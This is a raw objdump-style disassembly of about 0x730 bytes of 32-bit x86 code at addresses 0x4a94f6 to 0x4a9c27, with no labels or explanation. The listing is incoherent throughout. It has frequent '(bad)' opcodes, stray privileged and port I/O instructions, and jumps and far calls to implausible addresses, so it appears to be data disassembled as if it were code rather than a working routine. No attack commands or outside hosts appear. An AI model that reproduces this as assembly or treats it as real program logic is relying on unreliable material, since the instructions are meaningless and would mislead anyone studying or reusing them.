  4a94f6:	in     al,dx
  4a94f7:	lock adc al,BYTE PTR [ecx+0x4c285242]
  4a94fe:	or     al,0xf1
  4a9500:	(bad)  
  4a9501:	or     BYTE PTR [ebx],cl
  4a9503:	jb     0x4a9495
  4a9505:	push   eax
  4a9506:	test   DWORD PTR [esp+edi*8],0x83f2a62a
  4a950d:	fnstcw WORD PTR [ebx]
  4a950f:	outs   dx,BYTE PTR ds:[esi]
  4a9510:	(bad)  
  4a9511:	inc    esi
  4a9512:	retf   
  4a9513:	jle    0x4a9545
  4a9515:	ja     0x4a955a
  4a9517:	jle    0x4a94de
  4a9519:	xchg   edi,eax
  4a951a:	inc    esp
  4a951b:	fistp  WORD PTR [esi]
  4a951d:	jp     0x4a94af
  4a951f:	xchg   esi,eax
  4a9520:	inc    ebx
  4a9521:	jae    0x4a9517
  4a9523:	pop    eax
  4a9524:	or     eax,0x803ef2f8
  4a9529:	xchg   edi,eax
  4a952a:	dec    esi
  4a952b:	lock dec ebx
  4a952d:	mov    al,0x2b
  4a952f:	cmp    al,BYTE PTR [eax+0x323232a8]
  4a9535:	mov    ds:0x230d8486,al
  4a953a:	or     al,BYTE PTR [ebp+0x10]
  4a953d:	mov    ah,0x12
  4a953f:	push   es
  4a9540:	add    dl,BYTE PTR [edi+0x75c74d97]
  4a9546:	push   esp
  4a9547:	sbb    BYTE PTR [esp+edx*1],bl
  4a954a:	add    eax,0xe8d5980d
  4a954f:	test   eax,0x85be7c35
  4a9554:	div    bl
  4a9556:	adc    esi,esp
  4a9558:	mov    WORD PTR ds:0xe1e48023,ss
  4a955e:	not    BYTE PTR [eax]
  4a9560:	mov    esi,0xf84ddb94
  4a9565:	adc    al,0x25
  4a9567:	xor    BYTE PTR [edx+ebp*8-0x4eac5a3b],dl
  4a956e:	sub    al,0x20
  4a9570:	and    eax,DWORD PTR [ebp+0x4e4bfe95]
  4a9576:	push   ebx
  4a9577:	xor    BYTE PTR [esi+0x289e91b0],bl
  4a957d:	(bad)
  4a9580:	jb     0x4a959f
  4a9582:	inc    esp
  4a9583:	mov    bl,BYTE PTR [eax-0x57]
  4a9586:	data16 sub BYTE PTR ds:0x913d0735,ah
  4a958d:	pop    esi
  4a958e:	dec    ebx
  4a958f:	jg     0x4a9591
  4a9591:	mov    eax,0x632b9ed6
  4a9596:	enter  0x4266,0x2d
  4a959a:	or     ah,bh
  4a959c:	fisub  WORD PTR [eax+edi*4]
  4a959f:	cmovge ecx,DWORD PTR [esp+ebp*8-0x73]
  4a95a4:	test   DWORD PTR ds:0x6e8dc26c,esp
  4a95aa:	mov    fs,WORD PTR [ecx-0x2b]
  4a95ad:	loop   0x4a9550
  4a95af:	into   
  4a95b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a95b1:	pop    esp
  4a95b2:	jbe    0x4a9538
  4a95b4:	jne    0x4a95ba
  4a95b6:	sub    al,0xff
  4a95b8:	push   edx
  4a95b9:	mov    edi,0xaee04a70
  4a95be:	bound  esp,QWORD PTR [esp+ebp*4]
  4a95c1:	ret    0x29b5
  4a95c4:	add    eax,0xc77e063
  4a95c9:	xlat   BYTE PTR ds:[ebx]
  4a95ca:	add    DWORD PTR [eax+0xa],edx
  4a95cd:	shr    BYTE PTR [ebx],0xe9
  4a95d0:	add    cl,dl
  4a95d2:	sub    BYTE PTR [eax],al
  4a95d4:	inc    edi
  4a95d5:	fcom   st(3)
  4a95d7:	jle    0x4a95f3
  4a95d9:	inc    DWORD PTR [edx+0x58]
  4a95dc:	fldcw  WORD PTR [ebp+0x10]
  4a95df:	fistp  QWORD PTR [ebp-0x1c]
  4a95e2:	push   edx
  4a95e3:	push   0xd04b1202
  4a95e8:	mov    ebp,gs
  4a95ea:	push   ds
  4a95eb:	or     al,bl
  4a95ed:	add    DWORD PTR [eax+0x7dcb8113],0x6a9ee35e
  4a95f7:	out    dx,al
  4a95f8:	dec    edx
  4a95f9:	pushf  
  4a95fa:	add    eax,0x4389555b
  4a95ff:	dec    eax
  4a9600:	jmp    0x3e0f1a96
  4a9605:	jmp    DWORD PTR [ebx]
  4a9607:	in     al,dx
  4a9608:	add    dh,BYTE PTR [edx]
  4a960a:	sbb    BYTE PTR [ecx],dl
  4a960c:	ss icebp 
  4a960e:	xchg   ecx,eax
  4a960f:	div    BYTE PTR ds:0xe82a16f5
  4a9615:	sub    BYTE PTR [edi],bh
  4a9617:	inc    edx
  4a9618:	invd   
  4a961a:	and    ebx,DWORD PTR [edx+0x69]
  4a961d:	xchg   ebp,eax
  4a961e:	inc    eax
  4a961f:	mov    cl,0x57
  4a9621:	mov    al,ds:0xc2909045
  4a9626:	or     al,0x1b
  4a9629:	fild   DWORD PTR [esp+esi*8]
  4a962c:	nop
  4a962d:	mov    al,ds:0x2f19ac89
  4a9632:	add    DWORD PTR ds:0xc8c1a6d,ebx
  4a9638:	and    eax,0xd62c5ab9
  4a963d:	add    ah,BYTE PTR [edi+ecx*1]
  4a9640:	lods   eax,DWORD PTR ds:[esi]
  4a9641:	xchg   ebp,eax
  4a9642:	pop    ebp
  4a9643:	add    esp,DWORD PTR [edi+0x55]
  4a9646:	lods   al,BYTE PTR ds:[esi]
  4a9647:	push   edx
  4a9648:	dec    eax
  4a9649:	cmp    al,BYTE PTR [esi+edi*4]
  4a964c:	sub    bl,0xca
  4a964f:	jp     0x4a9634
  4a9651:	push   edx
  4a9652:	dec    ecx
  4a9653:	sbb    ebp,ebp
  4a9655:	(bad)  
  4a9656:	and    BYTE PTR [esi+0x27623f8c],al
  4a965c:	mov    ch,0x34
  4a965e:	or     BYTE PTR [edi-0x76],dh
  4a9661:	adc    eax,0xca7be90b
  4a9666:	push   ebp
  4a9667:	jnp    0x4a968e
  4a9669:	in     al,0x9c
  4a966b:	sbb    dh,BYTE PTR [esi]
  4a966d:	mov    ah,BYTE PTR [ecx]
  4a966f:	dec    edx
  4a9670:	push   ds
  4a9671:	xor    al,BYTE PTR [ebx-0x4129f346]
  4a9677:	xor    ebp,DWORD PTR [eax+0x74b0a0cd]
  4a967d:	sbb    DWORD PTR [edx],edx
  4a967f:	std    
  4a9680:	mov    ah,0x40
  4a9682:	lock push ebx
  4a9684:	push   0xb4ce1f60
  4a9689:	inc    ebx
  4a968a:	jmp    0x4a963d
  4a968c:	mov    dl,0x93
  4a968e:	ret    0x3b0d
  4a9691:	(bad)  
  4a9692:	sbb    DWORD PTR ds:0x980088b7,ebx
  4a9698:	inc    esi
  4a9699:	(bad)  
  4a969a:	and    dh,BYTE PTR [ecx-0x767ebd72]
  4a96a0:	cld    
  4a96a1:	add    ch,ch
  4a96a3:	lods   al,BYTE PTR ds:[esi]
  4a96a4:	and    bh,BYTE PTR [ebx+edi*2+0x7e93a08d]
  4a96ab:	test   BYTE PTR [edx-0x59],bl
  4a96ae:	inc    ecx
  4a96af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a96b0:	repnz xor BYTE PTR [ebp+0x30],ah
  4a96b4:	lea    ebx,[ebx-0x53]
  4a96b7:	or     ecx,DWORD PTR [eax+0x1e580fbc]
  4a96bd:	xchg   BYTE PTR [ebx+0x70],ah
  4a96c0:	cmc    
  4a96c1:	jbe    0x4a968b
  4a96c3:	hlt    
  4a96c4:	ret    0x78c8
  4a96c7:	and    esi,DWORD PTR [ecx+0x53]
  4a96ca:	(bad)  
  4a96cb:	adc    ebx,DWORD PTR [esi+0x5f3905e5]
  4a96d1:	jns    0x4a9735
  4a96d3:	rcl    BYTE PTR [edx],0x10
  4a96d6:	rcl    BYTE PTR [ebp+0x23],0x8a
  4a96da:	mov    eax,ds:0xc1204e0
  4a96df:	fcmove st,st(5)
  4a96e1:	push   eax
  4a96e2:	(bad)  
  4a96e3:	leave  
  4a96e4:	adc    BYTE PTR [ebp+ebx*4+0x51],cl
  4a96e8:	int    0x43
  4a96ea:	mov    ds:0x543c5d12,al
  4a96ef:	jns    0xcfd74bf6
  4a96f5:	fs push ebp
  4a96f7:	rcl    BYTE PTR [esi-0x7ccfd14d],1
  4a96fd:	push   es
  4a96fe:	sahf   
  4a96ff:	push   edx
  4a9700:	mov    esp,0x32865052
  4a9705:	outs   dx,BYTE PTR ds:[esi]
  4a9706:	add    BYTE PTR [ecx+0x407c709],cl
  4a970c:	fisttp DWORD PTR [ebp-0x143ffea1]
  4a9712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a9713:	out    0x4c,eax
  4a9715:	add    esp,DWORD PTR es:[ebx]
  4a9718:	daa    
  4a9719:	or     eax,0xdb645182
  4a971e:	jge    0x4a9772
  4a9720:	in     al,0xbc
  4a9722:	push   ecx
  4a9723:	mov    dh,0x18
  4a9725:	rcl    BYTE PTR [edx-0x5b],0x10
  4a9729:	jp     0x4a976e
  4a972b:	fs dec eax
  4a972d:	out    dx,eax
  4a972e:	test   BYTE PTR [ebx],ch
  4a9730:	imul   edx,DWORD PTR [edi+0x53b80410],0x30
  4a9737:	mov    eax,DWORD PTR [edi]
  4a9739:	sub    DWORD PTR [eax-0x60],ebx
  4a973c:	ret    
  4a973d:	rol    BYTE PTR [eax],0x85
  4a9740:	add    al,0x57
  4a9742:	addr16 lock pop ebx
  4a9745:	(bad)  
  4a9746:	mov    ch,0x10
  4a9748:	call   FWORD PTR [edi+0x73]
  4a974b:	or     al,0x9b
  4a974d:	dec    esp
  4a974e:	and    ebp,DWORD PTR [ebx-0x6d]
  4a9751:	mov    ecx,DWORD PTR [ecx]
  4a9753:	sub    BYTE PTR [esi-0x7f],dh
  4a9756:	mov    WORD PTR [esi+0x4c768531],ds
  4a975c:	test   al,0x3d
  4a975e:	sbb    DWORD PTR [edi],esp
  4a9760:	(bad)  
  4a9762:	loop   0x4a9760
  4a9764:	ins    DWORD PTR es:[edi],dx
  4a9765:	mov    ch,0x34
  4a9767:	push   ecx
  4a9768:	or     esi,DWORD PTR [esi-0x80]
  4a976b:	mov    ebx,0x70781b5c
  4a9770:	outs   dx,DWORD PTR ds:[esi]
  4a9771:	dec    eax
  4a9772:	jmp    0x4a978d
  4a9774:	mov    al,0x88
  4a9776:	push   esi
  4a9777:	add    eax,0xa5c08fa7
  4a977c:	stos   DWORD PTR es:[edi],eax
  4a977d:	add    BYTE PTR [ecx],al
  4a977f:	or     al,ah
  4a9781:	and    al,0x34
  4a9783:	gs ins DWORD PTR es:[edi],dx
  4a9785:	arpl   WORD PTR [ebx],sp
  4a9787:	loope  0x4a9729
  4a9789:	test   DWORD PTR [ecx],0x3315c7f6
  4a978f:	jg     0x4a9792
  4a9791:	mov    al,ds:0x26104b97
  4a9796:	jge    0x4a9718
  4a9798:	mov    DWORD PTR [ebp-0x7c],0x2038cbc0
  4a979f:	dec    ebp
  4a97a0:	neg    DWORD PTR [ebx+0x16b2d62]
  4a97a6:	sub    eax,0x7899341
  4a97ab:	cmp    BYTE PTR ds:0xdd8040a8,bl
  4a97b1:	mov    ecx,0xb036a1c4
  4a97b6:	inc    eax
  4a97b7:	ins    DWORD PTR es:[edi],dx
  4a97b8:	push   edi
  4a97b9:	add    eax,0x29044b18
  4a97be:	sub    eax,0xd993607b
  4a97c3:	arpl   WORD PTR [ebx-0xa],si
  4a97c6:	cli    
  4a97c7:	icebp  
  4a97c8:	push   eax
  4a97c9:	and    BYTE PTR [eax-0x4e02807],al
  4a97cf:	fxch   st(1)
  4a97d1:	sti    
  4a97d2:	ins    DWORD PTR es:[edi],dx
  4a97d3:	fst    QWORD PTR [edi+0x62]
  4a97d6:	nop
  4a97d7:	sub    al,0x92
  4a97d9:	inc    esp
  4a97da:	add    BYTE PTR [edx+0x6],cl
  4a97dd:	jne    0x4a97c6
  4a97df:	imul   esi,DWORD PTR [esi],0xf7168cdf
  4a97e5:	xchg   ebx,eax
  4a97e6:	pop    edx
  4a97e7:	xchg   esp,eax
  4a97e8:	nop
  4a97e9:	ins    BYTE PTR es:[edi],dx
  4a97ea:	mov    esp,0x85da79ef
  4a97ef:	xchg   esi,eax
  4a97f0:	push   es
  4a97f1:	jmp    0xa569454b
  4a97f6:	xchg   esp,eax
  4a97f7:	push   ss
  4a97f8:	xchg   ebp,eax
  4a97f9:	inc    ebx
  4a97fa:	cwde   
  4a97fb:	iret   
  4a97fc:	rcr    eax,cl
  4a97fe:	mov    ss,WORD PTR [edx+0x1200e97]
  4a9804:	adc    ecx,DWORD PTR [ecx+0x26b68c0d]
  4a980a:	jno    0x4a97f7
  4a980c:	and    al,0x5
  4a980e:	add    al,0x6
  4a9810:	push   es
  4a9811:	or     eax,0xe30d03af
  4a9816:	sbb    DWORD PTR [eax+ebp*8+0x1],0x5cc390c
  4a981e:	adc    al,0xe9
  4a9820:	sar    dh,0xae
  4a9823:	cld    
  4a9824:	mov    DWORD PTR ds:0x25221606,edx
  4a982a:	push   ebp
  4a982b:	das    
  4a982c:	sub    eax,0x520cc2e9
  4a9831:	cld    
  4a9832:	pop    ebx
  4a9833:	and    eax,DWORD PTR [eax-0x5a7d4f3a]
  4a9839:	xchg   ecx,eax
  4a983a:	rcr    BYTE PTR [eax+edi*4],1
  4a983d:	xor    dh,BYTE PTR [eax+0x57]
  4a9840:	mov    edi,DWORD PTR [ebx]
  4a9842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a9843:	jle    0x4a9824
  4a9845:	push   eax
  4a9846:	pop    ss
  4a9847:	or     DWORD PTR [eax+0x7714e0c2],ebp
  4a984d:	pop    esp
  4a984e:	inc    ebp
  4a984f:	add    BYTE PTR [esi-0x6639934e],ch
  4a9855:	stos   BYTE PTR es:[edi],al
  4a9856:	or     al,0x4d
  4a9858:	xor    DWORD PTR [esi+ebp*2+0x3f],esp
  4a985c:	or     esi,0xe
  4a985f:	jmp    0x4a989f
  4a9861:	or     BYTE PTR [ebx],al
  4a9863:	jmp    0x4a989e
  4a9865:	test   al,0x3
  4a9867:	cmp    al,0xca
  4a9869:	add    al,0x5a
  4a986b:	sub    al,0x10
  4a986d:	jp     0x4a9890
  4a986f:	adc    ebp,DWORD PTR [eax-0x6e]
  4a9872:	iret   
  4a9873:	jmp    0x4a98bf
  4a9875:	pop    ds
  4a9876:	rol    dl,cl
  4a9878:	data16 cmp BYTE PTR [esi+0x4a],bl
  4a987c:	sub    ebp,DWORD PTR [esi]
  4a987e:	or     al,dh
  4a9880:	ds jns 0x4a9887
  4a9883:	or     esp,DWORD PTR [edi+ebp*1]
  4a9886:	(bad)  
  4a9887:	loopne 0x4a982c
  4a9889:	adc    BYTE PTR [esi],ah
  4a988b:	jne    0x4a989d
  4a988d:	or     esi,DWORD PTR [esi]
  4a988f:	sub    BYTE PTR [eax],ah
  4a9891:	mov    al,0x10
  4a9893:	xchg   ebx,eax
  4a9894:	in     al,dx
  4a9895:	mov    eax,ds:0x30402359
  4a989a:	test   eax,0xfbd74b92
  4a989f:	or     edx,ecx
  4a98a1:	adc    esi,DWORD PTR [ebp+0x12]
  4a98a4:	push   esi
  4a98a5:	mov    dh,0x36
  4a98a7:	pop    edi
  4a98a8:	inc    esp
  4a98a9:	sahf   
  4a98aa:	iret   
  4a98ab:	push   0xbf838ae1
  4a98b0:	sbb    DWORD PTR [ebx+0x6181fc4d],ecx
  4a98b6:	cwde   
  4a98b7:	sub    BYTE PTR [ebx+ecx*1+0x3d],dl
  4a98bb:	jmp    0x4a989d
  4a98bd:	ins    BYTE PTR es:[edi],dx
  4a98be:	adc    al,0x47
  4a98c0:	fdiv   QWORD PTR [ecx+0x5c]
  4a98c3:	xchg   ebx,eax
  4a98c4:	fwait
  4a98c5:	jb     0x4a9914
  4a98c7:	and    DWORD PTR [edx+0x9],esi
  4a98ca:	add    eax,0xa54222ef
  4a98cf:	push   ss
  4a98d0:	pop    edx
  4a98d1:	push   0x27
  4a98d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a98d4:	(bad)  
  4a98d5:	mov    al,0xc0
  4a98d7:	add    ch,BYTE PTR [ecx-0xc]
  4a98da:	setne  BYTE PTR [edi-0x28618601]
  4a98e1:	test   BYTE PTR [esi-0x53f946b0],dh
  4a98e7:	mov    cl,0xe9
  4a98e9:	pop    esi
  4a98ea:	adc    BYTE PTR [edi+eiz*8-0x3e31105f],bl
  4a98f1:	jecxz  0x4a9969
  4a98f3:	and    BYTE PTR [edx],al
  4a98f5:	mov    edi,0x6160501
  4a98fa:	and    BYTE PTR [esi-0xf],dh
  4a98fd:	jmp    0x4a9963
  4a98ff:	and    ch,BYTE PTR [esi+eax*2]
  4a9902:	pop    ss
  4a9903:	adc    eax,0x5c1b0a57
  4a9908:	mov    eax,0x59561f25
  4a990d:	push   eax
  4a990e:	loope  0x4a98dc
  4a9910:	inc    eax
  4a9911:	mov    ah,0x1c
  4a9913:	and    al,0xb8
  4a9915:	mov    ah,0x85
  4a9917:	test   DWORD PTR [esi],esi
  4a9919:	cmp    ebx,eax
  4a991b:	mov    al,0x10
  4a991d:	or     DWORD PTR [ebp+0x14765b4b],ebx
  4a9923:	inc    ecx
  4a9924:	add    DWORD PTR [ebp+0x1729d23a],edi
  4a992a:	pop    es
  4a992b:	fild   QWORD PTR [ecx]
  4a992d:	jmp    0x4a990f
  4a992f:	popa   
  4a9930:	adc    bh,BYTE PTR [ecx-0x1f367c18]
  4a9936:	add    al,0x13
  4a9938:	dec    eax
  4a9939:	mov    WORD PTR [esi-0x40],es
  4a993c:	inc    ebx
  4a993d:	xchg   esp,eax
  4a993e:	mov    DWORD PTR [eax+0x6],eax
  4a9941:	pop    edx
  4a9942:	fs and edx,ebp
  4a9945:	out    dx,eax
  4a9946:	adc    DWORD PTR [esi],ebx
  4a9948:	dec    ebp
  4a9949:	hlt    
  4a994a:	sub    ecx,eax
  4a994c:	xchg   ecx,eax
  4a994d:	push   edx
  4a994e:	xchg   esi,eax
  4a994f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a9950:	int3   
  4a9951:	out    dx,al
  4a9952:	add    al,0x5d
  4a9954:	add    BYTE PTR [ebx+0xb],cl
  4a9957:	out    0x84,al
  4a9959:	cmp    BYTE PTR [edx+0x4688beee],ch
  4a995f:	mov    al,0xf8
  4a9961:	jge    0x4a9977
  4a9963:	cmp    BYTE PTR [ebx],dl
  4a9965:	xor    dh,BYTE PTR [esi]
  4a9967:	mov    ch,0xae
  4a9969:	mov    cl,BYTE PTR [ecx+0xd0be35e]
  4a996f:	mov    ds:0x89b65c2e,eax
  4a9974:	push   esi
  4a9975:	movsx  ecx,WORD PTR fs:[ebp-0x4c]
  4a997a:	pusha  
  4a997b:	inc    esp
  4a997c:	dec    ebp
  4a997d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a997e:	sub    DWORD PTR [ecx+0x14795cf2],edi
  4a9984:	adc    al,0x75
  4a9987:	push   ds
  4a9988:	test   cl,dl
  4a998a:	jne    0x4a999f
  4a998c:	push   cs
  4a998d:	ins    BYTE PTR es:[edi],dx
  4a998e:	cdq    
  4a998f:	mov    dl,0x8f
  4a9991:	xchg   ah,al
  4a9993:	pop    ebx
  4a9994:	rcr    DWORD PTR [ecx],0x70
  4a9997:	push   es
  4a9998:	mov    bh,0x8
  4a999a:	ds add al,0xfb
  4a999d:	push   esp
  4a999e:	pop    es
  4a999f:	add    eax,0xaa1e5d53
  4a99a4:	and    DWORD PTR [ebp-0x780d6acb],esi
  4a99aa:	(bad)  
  4a99ad:	imul   esp,DWORD PTR ss:[ecx],0x29
  4a99b1:	jne    0x4a997d
  4a99b3:	push   0x20420d39
  4a99b8:	pop    esi
  4a99b9:	or     eax,0xf4d7ce2
  4a99be:	mov    eax,ds:0x73fe00a4
  4a99c3:	dec    esp
  4a99c4:	or     ebp,DWORD PTR [esp+eax*1]
  4a99c7:	cmp    edx,DWORD PTR [esi+0x4]
  4a99ca:	jne    0x4a99ee
  4a99cc:	inc    eax
  4a99cd:	push   cs
  4a99ce:	call   0x75610512
  4a99d3:	sbb    DWORD PTR [ecx],edi
  4a99d5:	pop    eax
  4a99d6:	xor    BYTE PTR [edx+ebp*2+0x4a7a9e0b],ch
  4a99dd:	out    dx,eax
  4a99de:	xchg   ecx,eax
  4a99df:	aad    0xf6
  4a99e1:	repnz ficom DWORD PTR [eax+0x7e3b9841]
  4a99e8:	mov    ebx,0xb4c665db
  4a99ed:	xchg   ecx,eax
  4a99ee:	pop    eax
  4a99ef:	add    edx,DWORD PTR [edi+0x102a7640]
  4a99f5:	shl    DWORD PTR [esp+edx*1-0x7],1
  4a99f9:	rcl    ah,0x86
  4a99fc:	xor    al,0xa2
  4a99fe:	and    eax,0x94e7537e
  4a9a03:	sbb    al,0x80
  4a9a05:	std    
  4a9a06:	cmp    esi,0xf5957f06
  4a9a0c:	push   eax
  4a9a0d:	jge    0x4a9a00
  4a9a0f:	into   
  4a9a10:	jge    0xfacc996c
  4a9a16:	(bad)  
  4a9a17:	nop
  4a9a18:	mov    dh,0xb8
  4a9a1a:	add    DWORD PTR [eax+0x7e7089d6],eax
  4a9a20:	jae    0x4a9a37
  4a9a22:	nop
  4a9a23:	inc    esp
  4a9a24:	lea    edi,[eax-0x4d]
  4a9a27:	xchg   DWORD PTR [eax-0x64eb2788],eax
  4a9a2d:	iret   
  4a9a2e:	xor    ah,ah
  4a9a30:	lea    edx,[ecx]
  4a9a32:	mov    ecx,0x6967841
  4a9a37:	hlt    
  4a9a38:	sbb    eax,DWORD PTR [ebx-0x1c7dc7f7]
  4a9a3e:	or     al,0x51
  4a9a40:	inc    eax
  4a9a41:	adc    eax,0xffffff89
  4a9a44:	add    bl,al
  4a9a46:	xor    BYTE PTR [esi+0x1fccf888],dh
  4a9a4c:	fincstp 
  4a9a4e:	adc    eax,0x20ac870f
  4a9a53:	sbb    BYTE PTR [ebp-0x2af1dd12],bl
  4a9a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a9a5a:	sbb    eax,0x85ec0c
  4a9a5f:	popf   
  4a9a60:	dec    ebx
  4a9a61:	sbb    DWORD PTR [ecx+0x294c6150],eax
  4a9a67:	in     al,dx
  4a9a68:	add    cl,BYTE PTR [esi+0x30]
  4a9a6b:	push   ebx
  4a9a6c:	pop    ss
  4a9a6d:	mov    es,esp
  4a9a6f:	call   0x68d7:0x59a4fe63
  4a9a76:	mov    ebp,0x5988d336
  4a9a7b:	push   ebp
  4a9a7c:	lds    ebx,FWORD PTR ds:0x60429ed0
  4a9a82:	dec    ebp
  4a9a83:	sbb    BYTE PTR [esi],al
  4a9a85:	xlat   BYTE PTR ds:[ebx]
  4a9a86:	aam    0x3
  4a9a88:	pop    ss
  4a9a89:	adc    al,0x84
  4a9a8b:	retf   0x53a6
  4a9a8e:	cwde   
  4a9a8f:	lods   eax,DWORD PTR ds:[esi]
  4a9a90:	mov    dh,0x3e
  4a9a92:	fwait
  4a9a93:	dec    ebp
  4a9a94:	(bad)  
  4a9a95:	adc    al,0x12
  4a9a97:	in     al,dx
  4a9a98:	jmp    0x4a9b01
  4a9a9a:	xor    al,BYTE PTR [esi]
  4a9a9c:	dec    ebp
  4a9a9d:	repz push es
  4a9a9f:	cmp    ah,bl
  4a9aa1:	or     DWORD PTR [edi-0x64],ebx
  4a9aa4:	cld    
  4a9aa5:	push   es
  4a9aa6:	adc    BYTE PTR [esi-0x2f30c1ec],0xa9
  4a9aad:	neg    DWORD PTR [ebp+esi*8-0x4f885ea6]
  4a9ab4:	add    eax,0x4060301
  4a9ab9:	pop    ss
  4a9aba:	xchg   esi,eax
  4a9abb:	adc    BYTE PTR [eax-0x5c036684],0x8
  4a9ac2:	cmp    ah,ch
  4a9ac4:	dec    ecx
  4a9ac5:	pop    eax
  4a9ac6:	int    0x90
  4a9ac8:	popf   
  4a9ac9:	inc    ebp
  4a9aca:	pop    ebp
  4a9acb:	jp     0x4a9ada
  4a9acd:	or     BYTE PTR ds:[esi-0x2de27bb9],0xf6
  4a9ad5:	pop    edx
  4a9ad6:	mov    bl,BYTE PTR [ecx]
  4a9ad8:	mov    eax,ds:0x1b142042
  4a9add:	jge    0x4a9af2
  4a9adf:	xchg   ebp,eax
  4a9ae0:	in     eax,dx
  4a9ae1:	and    al,BYTE PTR [esi+eiz*1]
  4a9ae4:	sahf   
  4a9ae5:	pop    edi
  4a9ae6:	adc    al,BYTE PTR [esi-0x2e64c06e]
  4a9aec:	add    DWORD PTR [ecx-0x6],esi
  4a9aef:	pushf  
  4a9af0:	add    BYTE PTR [eax],0x92
  4a9af3:	outs   dx,BYTE PTR ds:[esi]
  4a9af4:	sahf   
  4a9af5:	inc    edx
  4a9af6:	dec    ebx
  4a9af7:	loopne 0x4a9b23
  4a9af9:	pop    edx
  4a9afa:	or     al,0x94
  4a9afc:	mov    dh,0xdb
  4a9afe:	cli    
  4a9aff:	or     al,0xe4
  4a9b01:	push   ss
  4a9b02:	mov    al,0xdb
  4a9b04:	and    eax,0xf6b42095
  4a9b09:	push   ecx
  4a9b0a:	or     BYTE PTR [edi],ah
  4a9b0c:	stos   DWORD PTR es:[edi],eax
  4a9b0d:	js     0x4a9ad2
  4a9b0f:	cmp    dh,BYTE PTR [ebx]
  4a9b11:	add    al,0x42
  4a9b13:	call   0x571f:0xa980836
  4a9b1a:	int    0xc1
  4a9b1c:	ficomp DWORD PTR [edi]
  4a9b1e:	test   BYTE PTR [ecx-0x4a6af177],ah
  4a9b24:	xchg   esp,eax
  4a9b25:	(bad)  
  4a9b26:	sahf   
  4a9b27:	adc    BYTE PTR [eax],0x27
  4a9b2a:	fild   WORD PTR [ebp+0x23]
  4a9b2d:	lods   eax,DWORD PTR ds:[esi]
  4a9b2e:	fwait
  4a9b2f:	out    dx,eax
  4a9b30:	(bad)  
  4a9b32:	out    dx,al
  4a9b33:	push   es
  4a9b34:	add    bl,BYTE PTR [esi+0x34f3b5a4]
  4a9b3a:	cmp    DWORD PTR [ebp+0x1],ecx
  4a9b3d:	shl    dh,0xf6
  4a9b40:	mov    ds:0x10030067,al
  4a9b45:	add    al,0x23
  4a9b47:	dec    ecx
  4a9b48:	pop    es
  4a9b49:	mov    BYTE PTR [ecx],ah
  4a9b4b:	pop    edi
  4a9b4c:	adc    BYTE PTR [eax+ebx*1],dl
  4a9b4f:	rol    BYTE PTR [edx-0x62],cl
  4a9b52:	xchg   ah,dl
  4a9b54:	sbb    al,0x18
  4a9b56:	pop    eax
  4a9b57:	bnd jo 0x4a9b26
  4a9b5a:	outs   dx,DWORD PTR ds:[esi]
  4a9b5b:	and    al,0xd8
  4a9b5d:	sbb    al,0x80
  4a9b5f:	(bad)  
  4a9b60:	in     eax,dx
  4a9b61:	xchg   ebx,eax
  4a9b62:	mov    eax,0xd02b3614
  4a9b67:	je     0x4a9bbb
  4a9b69:	dec    edx
  4a9b6a:	je     0x4a9ba2
  4a9b6c:	dec    edx
  4a9b6d:	add    bl,BYTE PTR [edx]
  4a9b6f:	inc    ebx
  4a9b70:	pop    es
  4a9b71:	rcl    BYTE PTR [eax],cl
  4a9b73:	lahf   
  4a9b74:	push   esi
  4a9b75:	dec    edx
  4a9b76:	cmp    BYTE PTR [ecx+ebx*4-0x59f4ab5e],ah
  4a9b7d:	call   0x5f24:0x17a44b84
  4a9b84:	lods   al,BYTE PTR ds:[esi]
  4a9b85:	arpl   WORD PTR [esi+0x33],sp
  4a9b88:	jne    0x4a9b9a
  4a9b8a:	and    al,0x5e
  4a9b8c:	mov    ds:0xd8508c28,eax
  4a9b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a9b92:	inc    esi
  4a9b93:	push   edx
  4a9b94:	gs jecxz 0x4a9ba4
  4a9b97:	cmp    al,BYTE PTR [esi+0x3b]
  4a9b9a:	push   edi
  4a9b9b:	push   ebx
  4a9b9c:	and    eax,0x70337323
  4a9ba1:	sub    bh,BYTE PTR [ebx]
  4a9ba3:	adc    BYTE PTR [eax],al
  4a9ba5:	mov    ebp,0x2c20b08
  4a9baa:	ret    0xa755
  4a9bad:	icebp  
  4a9bae:	jbe    0x4a9bd8
  4a9bb0:	(bad)  [esi]
  4a9bb2:	je     0x4a9bbc
  4a9bb4:	push   edx
  4a9bb5:	mov    ds:0xc26b3351,eax
  4a9bba:	or     DWORD PTR [esi],0x8371e2fd
  4a9bc0:	mov    ecx,?
  4a9bc2:	add    edi,esi
  4a9bc4:	cmp    bl,ch
  4a9bc6:	mov    fs:0xd7506e3b,eax
  4a9bcc:	cmp    bh,BYTE PTR [eax+0x71cc1456]
  4a9bd2:	pop    ecx
  4a9bd3:	in     eax,0x18
  4a9bd5:	xor    eax,esi
  4a9bd7:	data16 (bad) [eax+0x53015c12]
  4a9bde:	sti    
  4a9bdf:	or     DWORD PTR ds:0x16d611f0,esp
  4a9be5:	out    dx,al
  4a9be6:	es xor al,0xc6
  4a9be9:	or     BYTE PTR [ebp+0x2710eacb],0xe4
  4a9bf0:	int3   
  4a9bf1:	nop
  4a9bf2:	xor    eax,0x4d71a446
  4a9bf7:	and    DWORD PTR [eax-0x78],esp
  4a9bfa:	sbb    BYTE PTR [edi-0x40ae9310],dh
  4a9c00:	pop    eax
  4a9c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a9c02:	mov    dl,bh
  4a9c04:	aad    0x75
  4a9c06:	xchg   bl,bh
  4a9c08:	inc    esi
  4a9c09:	or     eax,DWORD PTR [esi-0x3d0677eb]
  4a9c0f:	jl     0x4a9c2b
  4a9c11:	mov    BYTE PTR [ebx],ch
  4a9c13:	cmp    dl,BYTE PTR [edi-0x37]
  4a9c16:	push   0xf
  4a9c18:	mov    edi,eax
  4a9c1a:	xor    eax,0xb201a385
  4a9c1f:	sub    DWORD PTR [eax+0x430c9ad6],edi
  4a9c25:	std    
  4a9c26:	into   
  4a9c27:	fmul   st(4),st
